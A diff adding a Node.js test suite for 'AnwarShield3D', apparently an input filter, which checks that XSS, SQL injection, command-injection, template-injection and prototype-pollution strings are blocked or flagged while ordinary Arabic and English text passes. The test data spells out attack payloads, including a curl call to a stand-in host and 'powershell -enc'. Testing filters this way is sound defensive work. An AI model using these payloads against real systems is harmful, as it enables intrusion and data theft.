@@ -1,0 +1,17 @@
+import test from 'node:test';
+import assert from 'node:assert/strict';
+import fs from 'node:fs';
+import vm from 'node:vm';
+const source=fs.readFileSync(new URL('../anwar-shield-3d.js',import.meta.url),'utf8');
+const document={addEventListener(){},body:{appendChild(){}},getElementById(){return null;},createElement(){return{setAttribute(){},style:{}};}};
+const sandbox={document,CustomEvent:class{constructor(type,options){this.type=type;this.detail=options.detail;}},dispatchEvent(){},setTimeout(){return 1;},clearTimeout(){},WeakMap,Object,String,Array,RegExp};
+sandbox.globalThis=sandbox;vm.runInNewContext(source,sandbox,{filename:'anwar-shield-3d.js'});
+const shield=sandbox.AnwarShield3D;
+test('version',()=>assert.equal(shield.version,'0.2.0'));
+test('blocks common XSS',()=>{for(const s of ['<script>alert(1)</script>','<img src=x onerror=alert(1)>','javascript:alert(1)','<svg onload=alert(1)>'])assert.equal(shield.inspect(s).status,'blocked',s);});
+test('blocks common SQL injection',()=>{for(const s of ["' OR 1=1 --",'UNION SELECT password FROM users','DROP TABLE users','information_schema.tables'])assert.equal(shield.inspect(s).status,'blocked',s);});
+test('blocks command injection chains',()=>{for(const s of ['hello; curl https://bad.example','$(bash -c id)','text && powershell -enc AAA'])assert.equal(shield.inspect(s).status,'blocked',s);});
+test('routes template and prototype patterns to review',()=>{assert.equal(shield.inspect('$'+'{constructor.constructor("return process")()}').status,'review');assert.equal(shield.inspect('__proto__.polluted = true').status,'review');});
+test('detects encoded executable markup',()=>{assert.equal(shield.inspect('%3Cscript%3Ealert(1)%3C/script%3E').status,'blocked');assert.equal(shield.inspect('&#x3c;script&#x3e;alert(1)').status,'blocked');});
+test('keeps ordinary Arabic and notebook prose clean',()=>{for(const s of ['السلام عليكم ورحمة الله وبركاته','كتبت اليوم قصيدة عن المطر والحنين.','أستغفر الله العظيم وأتوب إليه','Meeting notes: call the team at 10:30'])assert.equal(shield.inspect(s).status,'clean',s);});
+test('normalizes zero-width characters',()=>assert.equal(shield.inspect('java\u200Bscript:alert(1)').status,'blocked'));
